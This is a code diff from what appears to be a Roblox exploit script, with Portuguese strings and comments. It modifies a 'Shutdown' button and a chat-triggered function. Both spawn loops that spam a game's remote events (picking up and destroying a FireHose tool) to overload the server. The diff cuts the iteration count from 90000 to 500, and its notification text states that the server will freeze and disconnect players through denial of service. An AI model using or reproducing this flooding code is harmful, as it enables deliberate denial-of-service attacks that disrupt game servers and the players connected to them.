@@ -934,12 +934,12 @@ MainTab:Button({
         -- Notificação inicial de encerramento solicitada
         WindUI:Notify({ 
             Title = "Shutdown", 
-            Content = "O servidor esta sendo desligado e desconectando Players", 
+            Content = "O Servidor esta sofrendo o gargalo de 500 requisições, vai travar e desconectar por internet alguns jogadores por causa da negação de serviço.", 
             Duration = 5 
         })
 
         task.spawn(function()
-            for m = 1, 90000 do
+            for m = 1, 500 do
                 task.spawn(function()
                     if toolRemote:IsA("RemoteFunction") then
                         toolRemote:InvokeServer("PickingTools", "FireHose")
@@ -955,7 +955,7 @@ MainTab:Button({
                         fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
                     end
                 end
-                if m % 15 == 0 then task.wait(0.1) end
+                if m % 15 == 0 then task.wait(0.4) end
             end
         end)
 
@@ -1290,7 +1290,7 @@ local function executarShutdownPorChat()
     end)
 
     task.spawn(function()
-        for m = 1, 90000 do
+        for m = 1, 500 do
             task.spawn(function()
                 if toolRemote:IsA("RemoteFunction") then
                     toolRemote:InvokeServer("PickingTools", "FireHose")
@@ -1306,7 +1306,7 @@ local function executarShutdownPorChat()
                     fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
                 end
             end
-            if m % 15 == 0 then task.wait(0.1) end
+            if m % 15 == 0 then task.wait(0.4) end
         end
     end)
 
